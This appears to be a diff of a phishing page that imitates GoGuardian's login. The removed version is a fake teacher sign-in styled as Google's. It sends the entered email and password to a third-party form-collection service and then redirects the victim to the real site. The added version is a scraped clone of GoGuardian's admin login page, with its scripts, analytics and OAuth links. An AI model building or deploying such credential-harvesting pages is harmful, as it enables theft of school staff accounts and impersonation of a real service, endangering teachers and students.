@@ -1,35 +1,56 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>GoGuardian | Teacher Login</title>
-    <style>
-        body { font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #ffffff; width: 380px; padding: 48px 40px 36px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); text-align: center; }
-        .logo { width: 140px; margin-bottom: 24px; }
-        h1 { font-size: 22px; font-weight: 400; color: #202124; margin: 0 0 8px; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 32px; line-height: 1.4; }
-        .input-box { width: 100%; height: 48px; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; margin-bottom: 12px; font-size: 16px; box-sizing: border-box; }
-        .input-box:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
-        .btn-google { background-color: #1a73e8; color: #fff; width: 100%; padding: 10px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; height: 40px; }
-        .btn-google:hover { background-color: #185abc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.30), 0 1px 3px 1px rgba(60,64,67,0.15); }
-        .google-icon { width: 18px; height: 18px; background: white; padding: 4px; border-radius: 2px; margin-right: 12px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <img src="https://imgur.com" class="logo">
-        <h1>Sign in</h1>
-        <p>Use your Google Account to continue to GoGuardian Teacher</p>
-        <form action="https://formspree.io" method="POST">
-            <input type="email" name="email" class="input-box" placeholder="Email or phone" required>
-            <input type="password" name="password" class="input-box" placeholder="Enter your password" required>
-            <input type="hidden" name="_next" value="https://goguardian.com">
-            <button type="submit" class="btn-google">
-                <img src="https://wikimedia.org" class="google-icon">
-                Next
-            </button>
-        </form>
-    </div>
-</body>
-</html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="description" content="All of GoGuardian. Sign in with your GoGuardian Account. Enter your email and password or sign in with Google. One GoGuardian account for everything GoGuardian."><title>GoGuardian Account - Log in</title><link href="assets/images/shared/gg-logo-favicon.aa0a2e9e.png" rel="icon" type="image/png"><link href="//fonts.googleapis.com/css?family=Open+Sans:300,400" rel="stylesheet"><link href="assets/css/account.24b49a3c.css" rel="stylesheet"><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" charset="utf-8" src="//v2.zopim.com/?2lY5NSei8HiPDi6fdytouyU3f0MvcIXH" type="text/javascript"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/vendor/commons.59560acdd69ed701c941.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/zopim/2.0.2/zopim.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/google-analytics/2.18.6/google-analytics.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/actions/amplitude-plugins/f12a4347e1080fb88155.js" async="" status="loaded"></script><script type="text/javascript" src="https://v2.zopim.com/w?2lY5NSei8HiPDi6fdytouyU3f0MvcIXH"></script><style media="print" class="jx_ui_StyleSheet" __jx__id="___$_2" type="text/css">.zopim { display: none !important }</style></head><body><div class="zopim" __jx__id="___$_90 ___$_90" style="margin-top: 0px; margin-right: 0px; margin-bottom: 0px; padding: 0px; border: 0px; background: transparent; overflow: hidden; position: fixed; z-index: 16000002; width: 180px; height: 30px; right: 10px; bottom: 0px; display: none;" data-test-id="ChatWidgetButton"><iframe frameborder="0" src="about:blank" style="background-color: transparent; vertical-align: text-bottom; position: relative; width: 100%; height: 100%; min-width: 100%; min-height: 100%; max-width: 100%; max-height: 100%; margin: 0px; overflow: hidden; display: block;" data-test-id="ChatWidgetButton-iframe" title="Zendesk Chat widget button"></iframe></div><div class="zopim" __jx__id="___$_4 ___$_4" style="margin-top: 0px; margin-right: 0px; margin-bottom: 0px; padding: 0px; border: 0px; background: transparent; overflow: hidden; position: fixed; z-index: 16000001; right: 10px; bottom: 0px; border-top-left-radius: 5px; border-top-right-radius: 5px; display: none; width: 350px; height: 450px; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 3px 2px;" data-test-id="ChatWidgetWindow"><iframe frameborder="0" src="about:blank" data-test-id="ChatWidgetWindow-iframe" style="background-color: transparent; vertical-align: text-bottom; position: relative; width: 100%; height: 100%; min-width: 100%; min-height: 100%; max-width: 100%; max-height: 100%; margin: 0px; overflow: hidden; display: block;" title="Zendesk Chat widget window"></iframe></div><div id="app"><div class="inner-app gg4a" data-reactid=".0"><div class="wrapper" data-reactid=".0.0"><header data-reactid=".0.0.0"><nav class="contain" data-reactid=".0.0.0.0"><a class="logo active" href="#/" data-reactid=".0.0.0.0.0">GoGuardian</a></nav></header><div class="content app" data-reactid=".0.0.1"><div data-reactid=".0.0.1.0"><div data-reactid=".0.0.1.0.1"><div data-reactid=".0.0.1.0.1.0"><h1 data-reactid=".0.0.1.0.1.0.0">GoGuardian Admin</h1><h2 data-reactid=".0.0.1.0.1.0.1">Log in to your account</h2></div><div class="login" data-reactid=".0.0.1.0.1.1"><form data-reactid=".0.0.1.0.1.1.1"><input type="text" placeholder="Email" value="" data-reactid=".0.0.1.0.1.1.1.0"><input type="password" placeholder="Password" data-reactid=".0.0.1.0.1.1.1.1"><button type="submit" name="login" class="btn green" data-reactid=".0.0.1.0.1.1.1.2">Log in</button><div class="separator" data-reactid=".0.0.1.0.1.1.1.3">or</div><a href="https://gandalf.goguardian.com/v1/google/redirect" class="google-signin-button" data-reactid=".0.0.1.0.1.1.1.4"><figure class="icon-wrapper" data-reactid=".0.0.1.0.1.1.1.4.0"><div class="icon" data-reactid=".0.0.1.0.1.1.1.4.0.0"></div></figure><span data-reactid=".0.0.1.0.1.1.1.4.1">Log in with Google</span></a><a href="https://gandalf.goguardian.com/v1/oauth/clever" class="clever-signin-button" data-reactid=".0.0.1.0.1.1.1.5"><figure class="icon-wrapper" data-reactid=".0.0.1.0.1.1.1.5.0"><div class="icon" data-reactid=".0.0.1.0.1.1.1.5.0.0"></div></figure><span data-reactid=".0.0.1.0.1.1.1.5.1">Log in with Clever</span></a><a href="https://gandalf.goguardian.com/v1/oauth/classlink" class="classlink-signin-button" data-reactid=".0.0.1.0.1.1.1.6"><figure class="icon-wrapper" data-reactid=".0.0.1.0.1.1.1.6.0"><div class="icon" data-reactid=".0.0.1.0.1.1.1.6.0.0"></div></figure><span data-reactid=".0.0.1.0.1.1.1.6.1">Log in with ClassLink</span></a></form></div><nav class="actions" data-reactid=".0.0.1.0.1.2"><div data-reactid=".0.0.1.0.1.2.0"><a class="saml" href="#/staff-saml-login" data-reactid=".0.0.1.0.1.2.0.0">Sign in with Single Sign On</a><a class="signup" href="#/signup" data-reactid=".0.0.1.0.1.2.0.1">Need an account?</a><a class="forgot" href="#/forgot-password" data-reactid=".0.0.1.0.1.2.0.2">Forgot your password?</a></div></nav><a class="learnMore" href="https://www.goguardian.com/admin.html" target="_blank" data-reactid=".0.0.1.0.1.3">Learn More</a></div></div></div><div class="push" data-reactid=".0.0.2"></div></div><footer data-reactid=".0.1"><div class="contain" data-reactid=".0.1.0"><nav data-reactid=".0.1.0.0"><a href="https://www.goguardian.com/blog/" data-reactid=".0.1.0.0.0">Blog</a><a href="https://www.goguardian.com/privacy/" data-reactid=".0.1.0.0.1">Privacy Policy</a><a href="https://www.goguardian.com/eula/" data-reactid=".0.1.0.0.2">Terms</a></nav><p data-reactid=".0.1.0.1"><span data-reactid=".0.1.0.1.0">© </span><span data-reactid=".0.1.0.1.1">2026</span><span data-reactid=".0.1.0.1.2"> GoGuardian. All Rights Reserved.</span></p></div></footer></div></div><!-- Segment Integration --><script type="text/javascript" async="" src="https://cdn.segment.com/analytics.js/v1/Iqsh3Wt2YGjQiO7UfIdflmLEiTaSsGqe/analytics.min.js"></script><script>!(function () {
+      const analytics = (window.analytics = window.analytics || []);
+      if (!analytics.initialize)
+        if (analytics.invoked)
+          window.console &&
+            console.error &&
+            console.error('Segment snippet included twice.');
+        else {
+          analytics.invoked = !0;
+          analytics.methods = [
+            'trackSubmit',
+            'trackClick',
+            'trackLink',
+            'trackForm',
+            'pageview',
+            'identify',
+            'group',
+            'track',
+            'ready',
+            'alias',
+            'page',
+            'once',
+            'off',
+            'on',
+          ];
+          analytics.factory = function (t) {
+            return function () {
+              const e = Array.prototype.slice.call(arguments);
+              e.unshift(t);
+              analytics.push(e);
+              return analytics;
+            };
+          };
+          for (let t = 0; t < analytics.methods.length; t++) {
+            const e = analytics.methods[t];
+            analytics[e] = analytics.factory(e);
+          }
+          analytics.load = function (t) {
+            const e = document.createElement('script');
+            e.type = 'text/javascript';
+            e.async = !0;
+            e.src =
+              ('https:' === document.location.protocol
+                ? 'https://'
+                : 'http://') +
+              'cdn.segment.com/analytics.js/v1/' +
+              t +
+              '/analytics.min.js';
+            const n = document.getElementsByTagName('script')[0];
+            n.parentNode.insertBefore(e, n);
+          };
+          analytics.SNIPPET_VERSION = '3.0.1';
+          analytics.load('Iqsh3Wt2YGjQiO7UfIdflmLEiTaSsGqe');
+          analytics.page();
+        }
+    })();</script><script src="assets/js/bundle.10db8ef0.js"></script></body></html>
